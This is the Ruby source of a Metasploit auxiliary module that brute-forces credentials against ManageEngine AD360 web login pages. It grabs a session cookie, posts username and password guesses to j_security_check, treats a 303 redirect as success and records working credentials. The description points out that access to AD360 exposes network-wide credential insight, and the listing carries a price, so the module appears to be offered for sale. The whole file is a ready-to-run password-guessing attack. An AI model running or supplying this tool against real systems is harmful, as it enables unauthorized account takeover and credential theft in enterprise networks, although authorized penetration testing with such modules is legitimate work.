##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/http'

module Metasploit
  module Framework
    module LoginScanner
      class ManageEngineAD360 < ::Metasploit::Framework::LoginScanner::HTTP
        def attempt_login(credential)
          result_opts = {
            credential: credential,
            host: host,
            port: port,
            protocol: 'tcp',
            #service_name: 'http'
          }

          begin
            cli = Rex::Proto::Http::Client.new(host, port, {'Msf'=>framework,'MsfExploit'=>framework_module},ssl,ssl_version,proxies,http_username,http_password)
            configure_http_client(cli)
            cli.connect

            req = cli.request_cgi({
              'uri' => uri[0] + (uri[0][-1] == '/' ? '' : '/') + 'AppsHome.do'
            })

            res = cli.send_recv(req)

            cookie = res.get_cookies

            req = cli.request_cgi({
              'uri' => uri[0] + (uri[0][-1] == '/' ? '' : '/') + 'j_security_check',
              'method' => 'POST',
              'vars_post' => {
                'j_username' => credential.public,
                'j_password' => credential.private,
                'domainName' => uri[1],
                'AUTHRULE_NAME' => 'Authenticator'
              },
              'cookie' => cookie
            })

            res = cli.send_recv(req)

            if res && res.code == 303
              result_opts.merge!(status: ::Metasploit::Model::Login::Status::SUCCESSFUL, proof: res)
            else
              result_opts.merge!(status: ::Metasploit::Model::Login::Status::INCORRECT, proof: res)
            end

          rescue Exception => e
            result_opts.merge!(status: ::Metasploit::Model::Login::Status::UNABLE_TO_CONNECT, proof:e)
          end

          ::Metasploit::Framework::LoginScanner::Result.new(result_opts)
        end
      end
    end
  end
end


class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize
    super(
        'Name'           => 'ManageEngine AD360 Bruteforce',
        'Description'    => %q(
        This module attempts to bruteforce weak credentials on ManageEngine AD360 instances.

        ManageEngine AD360 is a popular enterprise solution for managing and
auditing environments using ActiveDirectory for authentication. Privileged
access to an AD360 instance could yield signficant insight into credentials
on the network.

        Categories: Enterprise

        Price: 3

        Video: https://asciinema.org/a/34cR03do7I4tceW1IYwdMZEAO

        OS: Multi

        Arch: Multi

        Requirements: Metasploit Framework
      ),
        'Author'         =>
          [
          ],
        'License'        => 'VolatileMinds',
        'References'     =>
          [
          ],
        'DefaultOptions' => {
            'RPORT'           => 8082,
            'STOP_ON_SUCCESS' => true
        }
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base URI', '/']),
        OptString.new('DOMAIN', [true, 'The domain to authenticate with', 'AD360 Authentication'])
      ], self.class)


  end

  def run_host(ip)
    cred_collection = ::Metasploit::Framework::CredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file: datastore['PASS_FILE'],
      password: datastore['PASSWORD'],
      user_file: datastore['USER_FILE'],
      userpass_file: datastore['USERPASS_FILE'],
      username: datastore['USERNAME'],
      user_as_pass: datastore['USER_AS_PASS']
    )

    scanner = Metasploit::Framework::LoginScanner::ManageEngineAD360.new(
      configure_http_login_scanner(
        host: ip,
        port: datastore['RPORT'],
        uri: [datastore['TARGETURI'], datastore['DOMAIN']],
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: 5,
        http_username: datastore['HttpUsername'],
        http_password: datastore['HttpPassword'],
      )
    )

    scanner.scan! do |result|
      creds = result.to_h
      creds.merge!(
        module_fullname: fullname,
        workspace_id: myworkspace_id
      )

      if result.success?
        credcore = create_credential(creds)
        creds[:core] = credcore
        create_credential_login(creds)
        print_good("#{ip}:#{rport} - LOGIN SUCCESSFUL: #{result.credential}")
      else
        invalidate_login(creds)
        vprint_error("#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status})")
      end
    end
  end
end
